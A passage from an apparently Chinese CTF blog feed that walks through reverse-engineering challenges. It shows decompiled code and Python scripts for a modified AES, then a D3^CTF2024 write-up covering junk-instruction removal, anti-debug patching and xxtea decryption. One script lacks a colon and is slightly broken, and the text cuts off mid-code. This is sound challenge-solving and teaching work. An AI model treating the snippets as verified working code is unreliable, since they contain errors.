v8[<span class="hljs-number">6</span>] = <span class="hljs-number">3</span>;<br>  v8[<span class="hljs-number">7</span>] = <span class="hljs-number">1</span>;<br>  v8[<span class="hljs-number">8</span>] = <span class="hljs-number">1</span>;<br>  v8[<span class="hljs-number">9</span>] = <span class="hljs-number">1</span>;<br>  v8[<span class="hljs-number">10</span>] = <span class="hljs-number">2</span>;<br>  v8[<span class="hljs-number">11</span>] = <span class="hljs-number">3</span>;<br>  v8[<span class="hljs-number">12</span>] = <span class="hljs-number">3</span>;<br>  v8[<span class="hljs-number">13</span>] = <span class="hljs-number">1</span>;<br>  v8[<span class="hljs-number">14</span>] = <span class="hljs-number">1</span>;<br>  v8[<span class="hljs-number">15</span>] = <span class="hljs-number">2</span>;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>[a1]; ++i )<br>  &#123;<br>    <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; ++j )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)j &gt;= <span class="hljs-number">4</span> )<br>        j____report_rangecheckfailure();<br>      v7[j] = <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">for</span> ( k = <span class="hljs-number">0</span>; k &lt; <span class="hljs-number">4</span>; ++k )<br>      &#123;<br>        v2 = v7[j];<br>        v7[j] = sub_433C3A(*(_BYTE *)(a2 + k + <span class="hljs-number">4</span> * i), v8[<span class="hljs-number">4</span> * j + k]) ^ v2;<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">for</span> ( m = <span class="hljs-number">0</span>; m &lt; <span class="hljs-number">4</span>; ++m )<br>    &#123;<br>      *(_BYTE *)(a2 + m + <span class="hljs-number">4</span> * i) = v7[m];<br>      *(_BYTE *)(a2 + m + <span class="hljs-number">4</span> * i) ^= <span class="hljs-number">0x54</span>u;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>修改AES对应的代码部分进行解密</p><p><img src="assets/2024-05-31-11-45-31-image.png"></p><p>比赛的时候电脑上没AES源码，嗯逆了两个小时，还原了加密，解密的时候列混合不会写</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br>ans = [<span class="hljs-number">0xB4</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0x7E</span>]<br><br>key = <span class="hljs-string">&quot;gah43jJKgfjGMeAR&quot;</span><br><br><span class="hljs-comment"># 密钥生成过程直接dump</span><br>key_box = [<span class="hljs-number">0x67</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x52</span>,<br> <span class="hljs-number">0x2B</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xDB</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x89</span>,<br> <span class="hljs-number">0x14</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0xA5</span>, <span class="hljs-number">0xB3</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0xAC</span>, <span class="hljs-number">0x3A</span>,<br> <span class="hljs-number">0xBB</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0xAC</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x96</span>,<br> <span class="hljs-number">0xFC</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x8F</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0xC5</span>,<br> <span class="hljs-number">0x29</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0xB5</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0xEE</span>,<br> <span class="hljs-number">0xDC</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0xB4</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0xAE</span>,<br> <span class="hljs-number">0x69</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0xB5</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0xB5</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x1B</span>,<br> <span class="hljs-number">0x54</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0xC1</span>,<br> <span class="hljs-number">0xA3</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0xA9</span>, <span class="hljs-number">0xB5</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0x74</span>,<br> <span class="hljs-number">0xCF</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0xF0</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0xA5</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x64</span>]<br><br>s_box = [<br>  <span class="hljs-number">0x63</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x01</span>, <br>  <span class="hljs-number">0x67</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0x7D</span>, <br>  <span class="hljs-number">0xFA</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0xF0</span>, <span class="hljs-number">0xAD</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0xA4</span>, <br>  <span class="hljs-number">0x72</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xCC</span>, <br>  <span class="hljs-number">0x34</span>, <span class="hljs-number">0xA5</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0xC7</span>, <br>  <span class="hljs-number">0x23</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xE2</span>, <br>  <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0x6E</span>, <br>  <span class="hljs-number">0x5A</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0xB3</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x84</span>, <br>  <span class="hljs-number">0x53</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0xCB</span>, <br>  <span class="hljs-number">0xBE</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0xFB</span>, <br>  <span class="hljs-number">0x43</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x3C</span>, <br>  <span class="hljs-number">0x9F</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0xA3</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x8F</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xF5</span>, <br>  <span class="hljs-number">0xBC</span>, <span class="hljs-number">0xB6</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xF3</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0x0C</span>, <br>  <span class="hljs-number">0x13</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0xA7</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x3D</span>, <br>  <span class="hljs-number">0x64</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x2A</span>, <br>  <span class="hljs-number">0x90</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0xDB</span>, <br>  <span class="hljs-number">0xE0</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0xD3</span>, <br>  <span class="hljs-number">0xAC</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x6D</span>, <br>  <span class="hljs-number">0x8D</span>, <span class="hljs-number">0xD5</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0xA9</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x7A</span>, <br>  <span class="hljs-number">0xAE</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0xA6</span>, <span class="hljs-number">0xB4</span>, <span class="hljs-number">0xC6</span>, <br>  <span class="hljs-number">0xE8</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0xBD</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x8A</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x3E</span>, <br>  <span class="hljs-number">0xB5</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0xF6</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xB9</span>, <br>  <span class="hljs-number">0x86</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0xD9</span>, <br>  <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0xDF</span>, <br>  <span class="hljs-number">0x8C</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x99</span>, <br>  <span class="hljs-number">0x2D</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0x16</span><br>]<br>t_box = [<span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sub_2A353C</span>(<span class="hljs-params">a, k</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(k):<br>        a = (<span class="hljs-number">27</span> * ((a &gt;&gt; <span class="hljs-number">7</span>) &amp; <span class="hljs-number">1</span>)) ^ (<span class="hljs-number">2</span> * a)<br>        a &amp;= <span class="hljs-number">0xFF</span><br>    <span class="hljs-keyword">return</span> a<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sub_2A3C3A</span>(<span class="hljs-params">a, b</span>):<br>    x = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>        x ^= sub_2A353C(a, i) * ((b &gt;&gt; i) &amp; <span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">return</span> x<br><br><br><span class="hljs-comment"># 加密过程</span><br>data = [<span class="hljs-number">0x30</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x66</span>]<br><br>xor_box = [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">11</span>):<br>    <span class="hljs-keyword">if</span> (i &gt; <span class="hljs-number">0</span>):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>            data[j] = s_box[data[j]] ^ <span class="hljs-number">0xA1</span><br><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>            <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(j):<br>                tmp = data[j]<br>                data[j+<span class="hljs-number">0</span>] = data[j+<span class="hljs-number">4</span>]<br>                data[j+<span class="hljs-number">4</span>] = data[j+<span class="hljs-number">8</span>]<br>                data[j+<span class="hljs-number">8</span>] = data[j+<span class="hljs-number">12</span>]<br>                data[j+<span class="hljs-number">12</span>] = tmp<br><br>        <span class="hljs-keyword">if</span> (i &lt; <span class="hljs-number">10</span>):<br>            tmp_box = [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>]<br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>                <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>                    tmp_box[k] = <span class="hljs-number">0</span><br>                    <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>                        a = data[r+<span class="hljs-number">4</span>*j]<br>                        b = t_box[r+<span class="hljs-number">4</span>*k]<br>                        tmp_box[k] ^= sub_2A3C3A(a, b)<br>                <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>                    data[k+<span class="hljs-number">4</span>*j] = tmp_box[k] ^ <span class="hljs-number">0x54</span><br><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>        data[j] ^= key_box[i*<span class="hljs-number">16</span>+j]<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>        data[j] ^= xor_box[j]<br><span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> data:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d), end=<span class="hljs-string">&#x27; &#x27;</span>)<br><span class="hljs-built_in">print</span>()<br><br>exit()<br></code></pre></td></tr></table></figure><h2 id="要地守护"><a href="#要地守护" class="headerlink" title="要地守护"></a>要地守护</h2><p>安卓题，AS刚好没装对应的SDK，没法调试，给的MUMU虚拟机对linux用户很不友好，静态分析了镜像没思路放弃了</p>]]></content>
    
    
    
    <tags>
      
      <tag>RE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>D3^CTF2024-Reverse</title>
    <link href="/2024/04/27/ctf_wp/D3-CTF2024-Reverse/"/>
    <url>/2024/04/27/ctf_wp/D3-CTF2024-Reverse/</url>
    
    <content type="html"><![CDATA[<h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>逆向部分题目很不错，VM题的伪随机控制流和迷宫题异常处理设置很巧妙，还剩两道没力气逆了，以后再补</p><h2 id="ezjunk"><a href="#ezjunk" class="headerlink" title="ezjunk"></a>ezjunk</h2><p>花指令，直接NOP掉，反编译main函数</p><p><img src="assets/2024-04-27-22-51-30-image.png"></p><p><img src="assets/2024-04-27-22-52-29-image.png"></p><p>加密部分是xxtea，观察调用时传入的参数，a2是sum，来自<code>loc_4015C3+2</code>，a3是delta，来自<code>loc_401A1C</code>，a4是key,来自<code>off_404350 + 400</code></p><p>delta在main里面，刚好是patch掉的部分，需要记录patch前的数据，sum在另一个函数里面，先去掉花指令</p><p><img src="assets/2024-04-27-22-58-14-image.png"></p><p>找到sum所在的地方，这部分在main运行前执行，LoadLibraryA没用，可以忽略，IsDebuggerPresent检测调试器，根据是否被调试设置key，patch掉反调试，记录patch前的sum值</p><p>写xxtea解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br>flag = [<span class="hljs-number">0x5406CBB1</span>, <span class="hljs-number">0xA4A41EA2</span>, <span class="hljs-number">0x34489AC5</span>, <span class="hljs-number">0x53D68797</span>, <span class="hljs-number">0xB8E0C06F</span>, <span class="hljs-number">0x259F2DB</span>, <span class="hljs-number">0x52E38D82</span>, <span class="hljs-number">0x595D5E1D</span>]<br><br>k2 = <span class="hljs-number">0xE8017300</span><br>k3 = <span class="hljs-number">0xFF58F981</span><br>key = [<span class="hljs-number">0x5454</span>, <span class="hljs-number">0x4602</span>, <span class="hljs-number">0x4477</span>, <span class="hljs-number">0x5E5E</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x46</span>]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">7</span>, <span class="hljs-number">2</span>):<br>    v6 = flag[i+<span class="hljs-number">1</span>]<br>    v7 = flag[i]<br>    a2 = k2<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>)<br>        a2 = a2 + <span class="hljs-number">0x100000000</span> - k3<br>        a2 &amp;= <span class="hljs-number">0xFFFFFFFF</span><br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span 